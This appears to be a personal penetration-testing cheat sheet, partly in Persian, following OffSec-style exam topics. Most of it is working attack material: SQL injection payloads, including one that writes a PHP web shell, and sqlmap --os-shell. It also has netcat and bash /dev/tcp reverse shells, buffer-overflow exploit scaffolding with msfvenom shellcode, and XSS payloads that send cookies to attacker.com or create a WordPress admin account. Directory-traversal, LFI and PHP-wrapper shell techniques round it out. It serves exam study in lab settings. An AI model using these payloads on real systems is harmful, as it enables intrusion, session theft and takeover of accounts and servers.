+SELECT * FROM users WHERE user_name='offsec' OR 1=1 -- 
+
+
+-------- -------- -------- note:
+--  =>  /* */
+'  =>  OR 1=1 --
+
+-------- -------- -------- --------  -------- ERROR BASED:
+
+MySQL / MariaDB:
+
+' OR 1=1 IN (SELECT @@version) -- //
+
+MSSQL:
+
+' OR 1=CONVERT(int, @@version) -- 
+' OR 1=CAST(@@version AS int) -- 
+
+PostgreSQL:
+
+' OR 1=CAST(version() AS INT) -- 
+' OR 1=CAST((SELECT version()) AS INT) -- 
+
+Oracle:
+
+' OR 1=(SELECT TO_NUMBER(banner) FROM v$version WHERE rownum=1) --
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) --
+
+' AND 1=TO_NUMBER((SELECT password FROM users WHERE username='admin')) --
+
+SQLite:
+
+' OR 1=CAST(sqlite_version() AS INT) -- 
+
+-------- -------- -------- --------  -------- UNION-based:
+
+All databases:
+
+' ORDER BY 1 -- //
+
+-------- MySQL / PostgreSQL / MSSQL / SQLite:
+
+' UNION SELECT 'a1','a2','a3','a4','a5' -- //
+
+-------- Oracle:
+
+' UNION SELECT 'a1','a2','a3','a4','a5' FROM dual -- //
+
+-------- -------- Database / User / Version:
+
+-------- MySQL:
+
+' UNION SELECT database(), user(), @@version, NULL, NULL -- //
+
+-------- PostgreSQL:
+
+' UNION SELECT current_database(), current_user, version(), NULL, NULL -- //
+
+-------- MSSQL:
+
+' UNION SELECT DB_NAME(), SYSTEM_USER, @@version, NULL, NULL -- //
+
+-------- Oracle:
+
+' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME'), USER, banner, NULL, NULL FROM v$version -- //
+
+-------- SQLite:
+
+' UNION SELECT 'main', 'sqlite_user', sqlite_version(), NULL, NULL -- //
+
+-------- -------- Enumerate Tables & Columns:
+
+-------- MySQL:
+
+' UNION SELECT NULL, table_name, column_name, table_schema, NULL FROM information_schema.columns WHERE table_schema = database() -- //
+
+' OR 1=1 IN (SELECT table_name FROM information_schema.columns WHERE table_schema = database()) -- //
+
+-------- PostgreSQL:
+
+' UNION SELECT NULL, table_name, column_name, table_catalog, NULL
+FROM information_schema.columns
+WHERE table_catalog = current_database() -- //
+
+-------- MSSQL:
+
+' UNION SELECT NULL, table_name, column_name, table_catalog, NULL
+FROM information_schema.columns
+WHERE table_catalog = DB_NAME() -- //
+
+-------- Oracle:
+
+' UNION SELECT NULL, table_name, column_name, owner, NULL
+FROM all_tab_columns -- //
+
+-------- SQLite:
+
+' UNION SELECT NULL, name, sql, NULL, NULL
+FROM sqlite_master
+WHERE type='table' -- //
+
+-------- -------- Dump Data (users table):
+
+-------- MySQL / PostgreSQL / SQLite:
+
+' UNION SELECT NULL, username, password, description, NULL FROM users -- //
+
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+===> /tmp/webshell.php?cmd=id
+
+-------- MSSQL:
+
+' UNION SELECT NULL, username, password, description, NULL FROM dbo.users -- //
+
+-------- Oracle:
+
+' UNION SELECT NULL, username, password, description, NULL FROM users -- //
+
+-------- -------- -------- --------  -------- BLIND:
+
+' AND <condition> -- //
+' AND <time_condition> -- //
+
+-------- -------- Boolean-based Blind SQLi (TRUE / FALSE):
+
+-------- MySQL:
+
+offsec' AND 1=1 -- //
+offsec' AND 1=2 -- //
+
+-------- PostgreSQL:
+
+offsec' AND 1=1 -- //
+offsec' AND 1=2 -- //
+
+-------- MSSQL:
+
+offsec' AND 1=1 -- //
+offsec' AND 1=2 -- //
+
+-------- Oracle:
+
+offsec' AND 1=1 -- //
+offsec' AND 1=2 -- //
+
+-------- SQLite:
+
+offsec' AND 1=1 -- //
+offsec' AND 1=2 -- //
+
+-------- -------- Time-based Blind SQLi (Delay):
+
+-------- MySQL:
+
+offsec' AND SLEEP(3) -- //
+offsec' AND IF(1=1, SLEEP(3), 0) -- //
+offsec' AND IF(SUBSTRING(database(),1,1)='o', SLEEP(3), 0) -- //
+
+-------- PostgreSQL:
+
+offsec' AND pg_sleep(3) -- //
+offsec' AND CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END -- //
+
+-------- MSSQL:
+
+offsec' WAITFOR DELAY '0:0:3' -- //
+offsec' IF (1=1) WAITFOR DELAY '0:0:3' -- //
+
+
+-------- Oracle:
+
+offsec' AND DBMS_LOCK.SLEEP(3) -- //
+offsec' AND CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP(3) ELSE NULL END -- //
+
+-------- SQLite:
+
+offsec' AND randomblob(100000000) -- //
+
+                                                ## SQL MAP ##
+
+
+sqlmap -u http://X.X.X.X/blindsqli.php?user=1 -p user
+
+--dbs
+-D offsec --tables
+-D offsec -T users --columns
+-D offsec -T users -C username,password --dump
+--dump
+
+sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#################################################################################################################
+
+
+
+                                    #### Task 3: Map to a Vulnerability Database ####
+                                                Locating Public Exploits
+
+                                            ## Online Exploit Resources ## 
+
+exploit db
+
+exploit storm
+
+offsec github
+
+firefox --search "Microsoft Edge site:exploit-db.com"
+
+| Operator   | مثال                      | کاربرد                          |
+| ---------- | ------------------------- | ------------------------------- |
+| `site:`    | `site:exploit-db.com`     | محدود کردن نتیجه به یک سایت خاص |
+| `inurl:`   | `inurl:php?id=`           | پیدا کردن URLهای آسیب‌پذیر      |
+| `intitle:` | `intitle:"index of"`      | هدف قرار دادن عنوان صفحه        |
+| `intext:`  | `intext:"SQL injection"`  | جستجو در متن صفحه               |
+| `" "`      | `"WordPress 5.2 exploit"` | جستجو دقیق عبارتی مشخص          |
+
+
+
+
+#################################################################################################################
+
+
+
+                                            ## Offline Exploit Resources ##
+Metasploit
+Browser Exploitation Framework (BeEF) 
+
+sudo searchsploit -u
+searchsploit "windows 11" smb
+
+
+| `searchsploit 48537`    | فقط نمایش اطلاعات اکسپلویت         |
+| `searchsploit -m 48537` | اکسپلویت را کپی می‌کند برای اجرا و ویرایش |
+
+
+grep Exploits /usr/share/nmap/scripts/*.nse
+nmap --script-help=clamav-exec.nse
+
+................................................
+searchsploit -m 50944
+search => main
+python3 50944.py -url http://192.168.50.11/project/ -u george@AIDevCorp.org -p AIDevCorp
+
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php?cmd=whoami
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
+nc -lvnp 6666
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash"
+.................................................
+
+
+
+#################################################################################################################
+
+
+
+                                   #### Task 4: Identify Common Vulnerabilities ####
+                                               Vulnerability Scanning
+                                               
+                                            ## Vulnerability Scanning with Nessus ##
+sudo systemctl start nessusd.service
+https://127.0.0.1:8834
+N4LM-AJTE-KME7-MKZ9-9JTH
+
+nc -nv 192.168.50.129 6666 -e /bin/bash
+
+## Vulnerability Scanning with Nmap ##
+sudo nmap -sV -p 443 --script "vuln" x.x.x.x
+search => CVE-xxx-xxx nse
+sudo cp xxx.nse /usr/share/nmap/scripts/abc-abc-cvexxx-xxx.nse
+sudo nmap --script-updatedb
+sudo nmap -sV -p 443 --script "abc-abc-cvexxx-xxx" x.x.x.x
+
+#################################################################################################################
+                                ############ Domain 2: Exploiting Systems (11%) ############# #################################################################################################################
+                                    #### Task 1: Locate Vulnerability/Misconfiguration ####
+                                                      Fixing Exploits
+                                    
+                                            ## Fixing Memory Corruption Exploits ##
+offset    = "A" * 780 
+JMP_ESP   =  "\x83\x0c\x09\x10"
+shellcode = "\x90"*16 + msf_shellcode
+exploit   = offset + JMP_ESP + shellcode
+
+i686-w64-mingw32-gcc xxx.c -o xxx.exe
+i686-w64-mingw32-gcc xxx.c -o xxx.exe -lws2_32
+
+server.sin_family = AF_INET;
+server.sin_family = AF_INET6;
+
+msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxx EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+
+gbd ./xxx
+source ~/pwn/bin/activate
+
+0x00400000 …  تقریباً ۱۰۰٪ خاموش
+0x10000000 …  ۹۹٫۹٪ خاموش
+0x6xxxxxxx …  ۹۵٪ خاموش
+0x7FFxxxxxxx …  ۹۹٫۹٪ روشن
+
+libspp.dll
+ESSFunc.dll
+MSVCR70.dll / MSVCR71.dll
+msvbvm60.dll
+SLMFC.DLL
+smtp.dll
+NetUtils.dll
+wxbase28u_net_vc_custom.dll
+wxbase30u_vc_custom.dll
+vb6.dll
+msi.dll
+msvcrt.dll (فقط نسخه‌های خیلی قدیمی)
+.exe برنامه (مثل syncbrs.exe, efss.exe, …)
+
+[AAAAAAAAAA...][EIP=JMP ESP][NOP][SHELLCODE]
+
+sudo wine xxx_exploit.exe
+
+a محاسبه offset
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
+msf-pattern_create -l 400
+
+unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
+
+------- padding, malloc, memset --------
+
+int initial_buffer_size = 780;
+char *padding = malloc(initial_buffer_size);
+
+Listing 17 - Allocating memory for the initial buffer using malloc
+
+memset(padding, 0x41, initial_buffer_size);
+
+Listing 18 - Filling the initial buffer with "A" characters
+
+memset(padding + initial_buffer_size - 1, 0x00, 1);
+
+Listing 19 - Memset setting the last byte to a null-terminator to convert the buffer into a string
+
+char *buffer = malloc(buffer_length);
+memset(buffer, 0x00, buffer_length);
+strcpy(buffer, request_one);
+strcat(buffer, content_length_string);
+strcat(buffer, request_two);
+strcat(buffer, padding);
+strcat(buffer, retn);
+strcat(buffer, shellcode);
+strcat(buffer, request_three);
+
+Listing 20 - Creating the final buffer for the exploit
+
+memset(padding + 781 - 1, 0x00, 1);
+
+objdump -d libspp.dll | grep -i "jmp *%esp"
+
+objdump -x libspp.dll | grep -i dllcharacteristics
+
+objdump -x libspp.dll | grep -i "DLL characteristics\|Dynamic base\|NX\|SafeSEH\|ASLR"
+
+DynamicBase
+No DynamicBase
+
+NXCompat
+
+NoSEH یا نبود SafeSEH
+
+HighEntropyVA
+
+# روش ۱: ساده‌ترین و سریع‌ترین (فقط jmp esp)
+objdump -d libspp.dll | grep -B2 -A2 "jmp.*esp" | grep -v "jmp.*e[p]x"
+
+# روش ۲: همه دستورات مفید برای return-oriented (بهترین روش)
+objdump -d libspp.dll | egrep 'ret|pop.*;.*ret|jmp.*esp|call.*esp' -A1
+# همه opcodeهای مفید برای return (ret, retn, jmp esp, call esp و ...)
+objdump -d libspp.dll | grep -E "ret|retn|jmp[[:space:]]+%esp|call[[:space:]]+%esp|pop .*; ret" -B2
+# فقط آدرس + دستور (تمیز برای کپی کردن)
+objdump -d libspp.dll | grep -E "ret|jmp .*esp|call .*esp" | awk '{print $1 " " $3 $4 $5}' | sed 's/://g'
+
+اگه DLL SafeSEH نداره
+objdump -d libspp.dll | grep -B1 "ret" | grep -E "pop.*pop" | grep -B1 "ret"
+
+# همه DLLهای لود شده بدون ASLR و بدون SafeSEH
+for i in *.dll; do objdump -x "$i" | grep -i "DynamicBase\|NoSEH" >/dev/null && echo "[+] $i → NON-ASLR + NoSafeSEH"; done
+
+------ Scenario -------
+
+------- fuzzing:
+
+#!/usr/bin/python3
+import socket
+ip = "10.10.10.20"
+port = 25                     # عوض کن
+
+s = socket.socket()
+s.connect((ip,port))
+s.recv(1024)
+s.send(b"USER test\r\n")
+s.recv(1024)
+s.send(b"PASS " + b"A"*5000 + b"\r\n")
+s.close()
+
+------- search dll:
+
+# همه DLLها رو چک کن کدوم بدون ASLR و بدون SafeSEH هستن (طلایی!)
+for i in *.dll; do 
+    echo -n "[*] $i : "
+    objdump -x "$i" 2>/dev/null | grep -i "DynamicBase\|NXCompat\|SafeSEH" | grep -v "No" || echo "ASLR=No  SafeSEH=No  DEP=No"
+done | grep -v "DynamicBase\|NXCompat\|SafeSEH"
+
+
+------- search jmp esp or ret:
+# بهترین jmp esp یا call esp یا ret
+objdump -d essfunc.dll | grep -i "jmp.*esp\|call.*esp\|ret" -B2 | grep -A1 -B1 "<" | grep -v "sub\|add\|mov" > jmpesp.txt
+
+# یا فقط آدرسهای تمیز
+objdump -d essfunc.dll | awk '/jmp[ \t]+%esp/ || /call[ \t]+%esp/ || /ret$/ {print $1 " " $2$3$4$5}' | sed 's/://g' | head -20
+
+------- search offset with pattern:
+
+# ۱- پترن بساز  De Bruijn sequence یا cyclic pattern
+python3 -c 'from pwn import *; print(cyclic(3000))' > pattern.txt
+
+# ۲- اکسپلویت اولیه با پترن
+# فایل: send_pattern.py
+#!/usr/bin/python3
+import socket
+
+ip = "10.10.10.20"
+port = 9999                    # پورت برنامه قربانی رو عوض کن
+
+pattern = open("pattern.txt", "rb").read()
+
+s = socket.socket()
+s.connect((ip, port))
+s.recv(1024)                   # بنر برنامه رو بگیر (مثلاً 220 SMTP...)
+s.send(b"USER anonymous\r\n")
+s.recv(1024)
+s.send(b"PASS " + pattern + b"\r\n")   # اینجا پترن رو می‌فرستیم
+print("[+] Pattern sent. Waiting for crash...")
+s.close()
+
+------- search offset blind:
+
+The instruction at 0x68413332 referenced memory at 0x68413332...
+Access violation reading location 0x68413332
+این یعنی EIP الان شده 68413332
+
+The memory could not be written -> 0x11223344
+Access violation when writing to 0x11223344
+این یعنی SEH record overwrite شده و ما بعداً از SEH exploit استفاده می‌کنیم.
+
+روش ۲ – اگه هیچ عددی تو خطا ندیدی (blind کامل) → از SEH استفاده کن
+
+------- find offset len:
+# روش ۱ (بهترین و سریع‌ترین – ابزار pwn)
+python3 -c 'from pwn import *; print(cyclic_find("68413332"))'
+# یا اگه little-endian رو اشتباه گرفتی اینا رو هم امتحان کن:
+python3 -c 'from pwn import *; print(cyclic_find(0x68413332))'
+python3 -c 'from pwn import *; print(cyclic_find("hA32"))'
+
+------- checking offset:
+
+# فایل: test_eip.py
+#!/usr/bin/python3
+import socket
+
+offset = -----2604------
+eip = b"BBBB"                  # ۴۲ ۴۲ ۴۲ ۴۲
+
+payload = b"A" * offset
+payload += eip
+payload += b"C" * 1000
+
+s = socket.socket()
+s.connect(("10.10.10.20", 9999))
+s.recv(1024)
+s.send(b"USER test\r\n")
+s.recv(1024)
+s.send(b"PASS " + payload + b"\r\n")
+s.close()
+
+
+Access violation when executing 0x42424242
+
+------- search jmp ESP:
+objdump -d نام_دی_ال_ال_بدون_ASLR.dll | grep "jmp.*esp"
+# مثلاً خروجی:
+#  00401234:   ffe4         jmp esp
+
+
+objdump -d libspp.dll | grep "jmp.*esp" -B1
+
+1001a0f0: 83 c4 0c          add    esp,0xc
+1001a0f3: ffe4              jmp    esp      ← این یکی
+--
+1002b3e8: 58                pop    eax
+1002b3e9: ffe4              jmp    esp      ← این یکی
+--
+1004c1a2: 81 ec 00 02 00 00 sub    esp,0x200
+1004c1a8: ffe4              jmp    esp      ← این یکی
+
+اولویت,نوع jmp esp,چرا خوبه؟ / بد؟,انتخاب کن؟
+1,ffe4
+,فقط دو بایت، هیچ دستور اضافه‌ای قبلش نیست → تمیزترین و مطمئن‌ترین,همیشه اول اینو تست کن
+2,ffe4 بعد از pop reg یا add esp
+,معمولاً کار می‌کنه، ولی ممکنه stack alignment رو بهم بزنه,اگه ۱ نبود، اینو تست کن
+3,"ffe4 بعد از sub esp, XXX"
+,بد! چون esp رو خیلی جابه‌جا می‌کنه → شل‌کدت خراب می‌شه,فقط اگه هیچی نبود
+4,ffe4 داخل یه فانکشن بزرگ,
+ممکنه registerها خراب باشن → کرش می‌کنه,آخرین گزینه
+
+
+# بهترین دستور برای پیدا کردن jmp esp تمیز
+objdump -d libspp.dll | grep -B5 "jmp.*esp" | grep -B5 -A1 "ffe4" | grep -v "sub.*esp\|add.*esp"
+# همه jmp esp های تمیز رو نشون بده
+objdump -d libspp.dll | grep "ffe4" | grep -v "sub\|add\|pop"
+
+
+
+------- make exploit:
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d" -f python
+
+------- null terminator:
+چیزی که تو خطای ویندوز دیدی,یعنی چی؟,راه‌حل فوری
+EIP = 42424242
+,همه چیز عالیه → برو مرحله بعد,هیچی، ادامه بده
+EIP = 42424241
+,آخرین بایت A مونده → مشکل NULL,offset += 1
+EIP = 42424141
+,دو تا بایت آخر A مونده,offset += 1 یا offset += 2
+EIP = 41424242
+,اولین بایت A مونده → خیلی رایج,offset += 1
+EIP = 00004242
+,NULL داره وسط می‌پره,حتماً offset += 1
+
+
+
+هر وقت تو تست EIP دیدی یکی از ۴ بایت EIP هنوز "A" (یعنی 0x41) مونده → یعنی strcat تو برنامه قربانی داره با NULL قطع می‌کنه → فوراً این کار رو بکن:
+offset += 1
+# یا در موارد خیلی نادر:
+offset += 4   # اگه alignment خیلی بهم ریخته باشه
+
+
+
+#################################################################################################################
+
+
+
+
+                                            ## Fixing Web Exploits ##
+
+Does it initiate an HTTP or HTTPS connection?
+Does it access a specific web application path or route?
+Does the exploit leverage a pre-authentication vulnerability?
+If not, how does the exploit authenticate to the web application?
+How are GET or POST requests crafted to trigger and exploit the vulnerability? Is there any HTTP method involved?
+Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
+Will oddities such as self-signed certificates disrupt the exploit?
+
+1- base_url
+base_url = "http://192.168.1.10/cmsms/admin"
+base_url = "https://192.168.50.120/admin"
+
+2- SSL
+verify=False
+
+3- POST request
+response = requests.post(url, data=data)
+response = requests.post(url, data=data, verify=False)
+
+4- Credentials
+username = "admin"
+password = "password"
+
+5- payload
+<?php system($_GET['cmd']); ?>
+
+6- index out of range
+print "[+] String that is being split: " + location
+[+] String that is being split:
+https://10.11.0.128/admin?_sk_=f2946ad9afceb247864
+
+
+[+] Exploit succeeded, shell can be found at: https://192.168.50.45/uploads/shell.php
+curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami
+
+
+
+#################################################################################################################
+
+
+
+                             #### Task 2: Modify Proof of Concept (PoC) or Execute Attack Path ####
+                                          Introduction to Web Application Attacks
+                                   
+                                            ## Security Testing with Burp Suite ##
+
+-------- nmap:
+
+جستجوی اسکریپت‌های مفید
+nmap --script http-enum <IP>
+CMS:WordPress,Joomla,Drupal,Ghost,Typo3,BlogWorx => searchsploit wordpress 5.2
+
+تشخیص CMS یا فایل‌های مخفی
+nmap --script http-wordpress-enum <IP>
+
+-------- Wappalyzer:
+
+“WordPress 5.1 — PHP”
+/wp-content/uploads/
+/wp-login.php
+
+JavaScript Library!
+
+
+
+-------- curl:
+
+Attempting to register a new user as admin
+
+curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
+
+Logging in as an admin user
+
+curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+
+Attempting to Change the Administrator Password via a POST request
+
+curl  \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
+  -d '{"password": "pwned"}'
+
+Attempting to Change the Administrator Password via a PUT request
+
+curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+
+Successfully logging in as the admin account
+  
+curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+  
+-------- Burp Suite Proxy:
+
+
+#################################################################################################################
+
+
+
+                                            ## Enumerating and Abusing APIs ##
+
+-------- Debug Web App Source Code:
+JS files:
+
+HTML files:
+exxample: <!-- TODO: remove debug route before prod -->
+
+Headers:
+example: X-Powered-By: PHP/5.3
+
+Cookies:
+example: Set-Cookie: sessionID=12345
+
+-------- Debugging Page Content:
+URL:
+.php → سایت PHP
+.jsp, .do → Java
+.py → Python/Flask
+.asp → ASP.NET 
+route → /login ,  /profile , /books/12
+
+-------- Response Headers:
+
+Server:
+→ Apache, nginx, Microsoft-IIS
+
+X-Powered-By:
+→ PHP/7.4, ASP.NET, Express.js
+
+X-AspNet-Version:
+ASP.NET version
+
+Set-Cookie:
+Session / CSRF / Authentication
+
+Content-Type:
+JSON؟ HTML؟ XML؟
+
+Cloud Headers:
+x-amz-cf-id → website runs on CloudFront
+cf-ray → Cloudflare
+
+اگر دیدی سایت PHP قدیمی استفاده می‌کند → احتمال LFI/RFI/File Upload
+✔ اگر دیدی ASP.NET است → مسیرهای خاص دارد
+✔ اگر سرور Apache 2.2 باشد → آسیب‌پذیری‌های زیادی دارد
+✔ اگر Cloudflare باشد → IP اصلی مخفی است
+✔ اگر nginx باشد → مسیرهای config خاص دارد
+
+-------- robots.txt و sitemap.xml:
+
+-------- GET , POST , PUT:
+
+1. GET — فقط اطلاعات می‌گیری
+درخواست معمولی مرورگر
+هیچ دیتایی تغییر نمی‌دهد
+مثل: دیدن لیست کاربران، دیدن صفحه پروفایل، دریافت JSON
+استفاده در تست امنیت:
+دیدن اینکه API چی برمی‌گردونه
+پیدا کردن endpoint
+تست اینکه پارامترها ولیدیشن دارند یا نه
+تست IDOR → با تغییر ID داخل GET
+مثال ساده:
+GET /users/v1
+
+2. POST — ایجاد چیزی جدید
+در دیتابیس چیزی اضافه می‌شود
+مثل: ساخت اکانت، لاگین کردن، ساختن پست در سایت
+استفاده امنیتی:
+تست ثبت‌نام (register) برای privilege escalation
+تست لاگین
+تست ارسال payloadهای XSS/SQLi
+تست bypass کردن اعتبارسنجی‌ها
+مثال:
+POST /users/v1/register
+{"username":"test","password":"123"}
+
+3. PUT — تغییر کامل یک رکورد
+برای آپدیت کردن چیزی استفاده می‌شود
+معمولاً کل آبجکت را جایگزین می‌کند
+استفاده امنیتی:
+تغییر پسورد دیگران
+تغییر role (کاربر → admin)
+تست misconfigured APIs
+تست IDOR
+مثال:
+PUT /users/v1/admin/password
+{"password":"newpass"}
+
+example:
+
+/users/v1
+/users/v1/admin/password
+/users/v1/login
+/users/v1/register
+
+405 Method Not Allowed
+
+curl -X POST ...
+curl -X PUT ...
+curl -X PATCH ...
+
+ا POST یک اکانت admin ساختی
+با PUT پسورد admin واقعی را تغییر دادی
+سپس با GET یا POST تست لاگین کردی
+
+curl http://target/api/users
+curl http://target/api/users/admin/password  
+curl -X PUT -d '{"password":"hacked"}'
+curl -X POST -d '{"username":"admin", "password":"hacked"}'
+
+اگر token گرفتی → تمومه، نمره کامل
+
+-------- Cross-Site Scripting (Stored XSS):
+
+http://site.com/search?q=<script>alert(1)</script>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<script>confirm(1)</script>
+<svg/onload=alert(1)>
+
+nc -lvnp 80
+or
+python3 -m http.server 80
+
+<script>
+fetch("http://attacker.com/?c=" + document.cookie)
+</script>
+
+<script>fetch('http://your-ip/?c='+document.cookie)</script>
+
+<img src="http://attacker.com/?cookie="+document.cookie>
+
+-------- Cross-Site Scripting (Reflected XSS):
+
+?page=<script>alert(1)</script>
+
+
+-------- Cross-Site Scripting (DOM-based XSS):
+
+let name = location.hash.substring(1);
+document.body.innerHTML = name;
+
+http://example.com/#<script>alert(1)</script>
+
+-------- Special Characters:
+<  >  '  "  {  }  ;
+
+-------- Encoding:
+
+URL Encoding:
+space → %20
+< → %3C
+> → %3E
+
+HTML Encoding:
+< → &lt;
+> → &gt;
+" → &quot;
+
+-------- Etrance:
+<div> Hello USER_INPUT </div>   =>   <script>alert(1)</script>
+
+<script>
+var name = "USER_INPUT";
+</script>                       =>   "; alert(1); //
+
+<img src="USER_INPUT">          =>   " onerror="alert(1)
+
+
+HttpOnly cookie
+
+اگر این فعال باشه، جاوااسکریپت نمی‌تونه کوکی را بخونه → پس ما نمی‌توانیم سشن ادمین را بدزدیم.
+
+$_SERVER
+.$record
+
+curl -i http://target --user-agent "TESTXSS"
+curl http://target/wp-admin/admin-ajax.php?action=get_visitors
+
+
+-------- Map: 
+
+kali@kali:~$ cat /etc/hosts 
+...
+192.168.50.16 offsecwp
+
+
+First Test:
+<> ' " ; { } 
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+
+tester123
+<tester123>
+<tester123
+"><tester123>
+'><tester123>
+"><tester123><
+<script>alert(1)</script>
+
+Bypass Test:
+<script> is blocked => <img src=x onerror=alert(1)> یا <svg onload=alert(1)>
+" ' is blocked => `
+onerror, onload is blocked => <details open ontoggle=alert(1)> یا <iframe src=javascript:alert(1)>
+<script>alert(1)</script> => <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script> => <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+all tags are blocked => javascript:alert(1) توی href یا location     or      onmouseover=alert(1) یا onerror=alert(1) => onmouseover=alert(1) یا onerror=alert(1)
+
+XSS stealth encoding trick:
+
+function e(script){return [...s].map(c=>c.charCodeAt()).join(',')}
+new Image().src = "http://YOUR-IP:8000/?cookie=" + document.cookie;
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+curl -A "<script>eval(String.fromCharCode(...))</script>" http://target
+
+
+
+
+
+-------- Payloads:
+
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+
+Gathering WordPress Nonce
+
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+
+Creating a New WordPress Administrator Account
+
+function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
+
+JS Encoding JS Function
+
+
+
+
+
+
+
+var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
+
+#################################################################################################################
+
+                              #### Task 3: Achieve Low-Privileged Access ####
+                                   Common Web Application Attacks
+                                   
+                               ## File Upload Vulnerabilities ##
+
+
+web root: /var/www/html/ 
+web app: /var/www/html/cms/
+
+/etc/hosts
+
+Directory Traversal:
+/index.php?page=../../../../../../../../../etc/passwd
+/index.php?page=../../../../../../../../../home/XXXX/.ssh/id_rsa
+
+ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+chmod 400 dt_key
+
+C:\Windows\System32\drivers\etc\hosts => ..\..\..\..\Windows\System32\drivers\etc\hosts
+find webserver => find webserver default paths => ex:iis => C:\inetpub\logs\LogFiles\W3SVC1\  or C:\inetpub\wwwroot\web.config
+ 
+test with all: \ / %5c
+space: %20
+
+
+
+
+------------ LFI:
+<?php echo system($_GET['cmd']); ?>
+space : %20
+bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+
+/etc/passwd
+/var/log/apache2/access.log
+/proc/self/environ
+
+C:\Windows\win.ini
+C:\xampp\apache\logs\access.log
+C:\inetpub\logs\LogFiles\W3SVC1
+
+Perl:
+open(FILE, $page);
+ASP/ASPX:
+?page=../../windows/win.ini
+JSP(JAVA):
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+------------ PHP wrapper:
+
+php://filter → برای دیدن سورس PHP بدون اجرا
+data://wrapper → برای وارد کردن کد PHP و اجرای آن
+
+?page=admin.php => ?page=php://filter/resource=admin.php => ?page=php://filter/convert.base64-encode/resource=admin.php => echo <BASE64> | base64 -d
+
+?page=data://text/plain,<?php system('ls'); ?> => ?page=data://text/plain,<?php%20system('ls');?> => (WAF)
+ => echo -n '<?php echo system($_GET["cmd"]);?>' | base64 => PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+ => ?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
+
+allow_url_include = On
+
+php file includes:
+
